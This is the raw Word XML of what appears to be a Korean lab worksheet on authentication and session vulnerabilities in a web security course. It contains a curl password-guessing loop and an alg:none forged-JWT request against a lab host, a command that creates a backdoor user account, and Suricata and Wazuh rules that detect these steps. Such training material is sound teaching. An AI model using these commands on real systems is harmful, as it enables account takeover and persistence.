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[웹취약점 W4] 인증/세션 — 약한 PW·JWT·세션 고정 vs 인증 보안 점검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web-vuln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웹취약점 점검 4주차 — </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:hAnsi="맑은 고딕" w:eastAsia="맑은 고딕"/>
          <w:b/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t>인증/세션 관리</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:hAnsi="맑은 고딕" w:eastAsia="맑은 고딕"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t>. 약한 패스워드·JWT 변조·쿠키 속성·세션 고정·인증 우회를 점검한다.</w:t>
      </w:r>
      <w:r>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:hAnsi="맑은 고딕" w:eastAsia="맑은 고딕"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t>공격자는 인증을 공략하고, 점검자(너)는 인증/세션 보안 통제를 구현해 방어한다.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:hAnsi="맑은 고딕" w:eastAsia="맑은 고딕"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t xml:space="preserve">▸ 이야기: 공격자가 약한 인증/JWT 변조(태그 </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>wv04r1</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:hAnsi="맑은 고딕" w:eastAsia="맑은 고딕"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t>)로 침투하고 위조 JWT(</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>/tmp/.wv04jwt</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:hAnsi="맑은 고딕" w:eastAsia="맑은 고딕"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t xml:space="preserve">)와 계정 </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>wva04</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:hAnsi="맑은 고딕" w:eastAsia="맑은 고딕"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t xml:space="preserve"> 를 남긴다.</w:t>
      </w:r>
      <w:r>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:hAnsi="맑은 고딕" w:eastAsia="맑은 고딕"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t>점검자는 ① 인증 공격 탐지, ② 세션/JWT Wazuh 룰, ③ 인증/세션 점검 종합·R/B/P 로 대응한다.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:hAnsi="맑은 고딕" w:eastAsia="맑은 고딕"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t>▸ 모드: solo/duel. 공격자=외부 공격자 VM(192.168.0.202)(192.168.0.202), Red 채점=대상 흔적(WAF audit 태그/JWT 파일·계정).</w:t>
      </w:r>
      <w:r>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:hAnsi="맑은 고딕" w:eastAsia="맑은 고딕"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t xml:space="preserve">▸ 마커: 태그 </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:hAnsi="맑은 고딕" w:eastAsia="맑은 고딕"/>
          <w:b/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t>`wv04r1-&lt;본인id&gt;`</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:hAnsi="맑은 고딕" w:eastAsia="맑은 고딕"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t xml:space="preserve">, 위조 JWT </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:hAnsi="맑은 고딕" w:eastAsia="맑은 고딕"/>
          <w:b/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t>`/tmp/.wv04jwt`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wv04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`wva04`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</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:hAnsi="맑은 고딕" w:eastAsia="맑은 고딕"/>
          <w:b/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t>sid 9904011</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:hAnsi="맑은 고딕" w:eastAsia="맑은 고딕"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t xml:space="preserve">, Wazuh </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:hAnsi="맑은 고딕" w:eastAsia="맑은 고딕"/>
          <w:b/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t>id 105041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[인증 공격] — 약한 PW/JWT alg:none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pPr>
        <w:shd w:val="clear" w:fill="F2F2F2"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="19"/>
        </w:rPr>
        <w:t>for pw in admin password 123456; do</w:t>
        <w:br/>
        <w:t xml:space="preserve">  curl -s -A "wv04r1-kim" -H "Host: neobank.el34.lab" --data "username=admin&amp;password=$pw" "http://192.168.0.161/login"</w:t>
        <w:br/>
        <w:t>done</w:t>
        <w:br/>
        <w:t>curl -s -A "wv04r1-kim" -H "Authorization: Bearer eyJhbGciOiJub25lIn0.eyJ1IjoiYWRtaW4ifQ." \</w:t>
        <w:br/>
        <w:t xml:space="preserve">  -H "Host: neobank.el34.lab" "http://192.168.0.161/api/me"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태그 </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>wv04r1</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:hAnsi="맑은 고딕" w:eastAsia="맑은 고딕"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t xml:space="preserve"> 흔적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[위조 토큰] — JWT 위조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'wv04 forged JWT: alg=none, user=admin, no signature verify' &gt; /tmp/.wv04jwt</w:t>
        <w:br/>
        <w:t>sudo useradd -m -s /bin/bash wva04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/tmp/.wv04jwt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wv04</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:hAnsi="맑은 고딕" w:eastAsia="맑은 고딕"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t xml:space="preserve">) 또는 </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>wva04</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:hAnsi="맑은 고딕" w:eastAsia="맑은 고딕"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t xml:space="preserve">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22점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[인증 공격 탐지] — Suricata 룰 (sid 9904011)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(msg:"WEBVULN-W04 JWT alg none tampering"; flow:to_server; content:"eyJhbGciOiJub25lIn0"; nocase; sid:9904011;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9904011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[세션/JWT 보호] — Wazuh 룰 (id 105041)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name="edu,webvuln,"&gt;</w:t>
        <w:br/>
        <w:t xml:space="preserve">  &lt;rule id="105041" level="12"&gt;</w:t>
        <w:br/>
        <w:t xml:space="preserve">    &lt;if_group&gt;edu&lt;/if_group&gt;</w:t>
        <w:br/>
        <w:t xml:space="preserve">    &lt;match&gt;wva04&lt;/match&gt;</w:t>
        <w:br/>
        <w:t xml:space="preserve">    &lt;description&gt;WEBVULN-W04 - auth bypass / forged token / account&lt;/description&gt;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105041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[인증/세션 점검 종합·R/B/P]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인증/세션 점검(PW 정책/계정 잠금/JWT 서명·alg 고정/쿠키 속성/세션 고정/세션 재발급) + 권고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R/B/P 회고 + 위조 JWT(</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>/tmp/.wv04jwt</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:hAnsi="맑은 고딕" w:eastAsia="맑은 고딕"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t>)·계정(wva04) 헌팅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>본인 SIEM 에 최근 경보 + 제출한 인증/세션 점검·R/B/P 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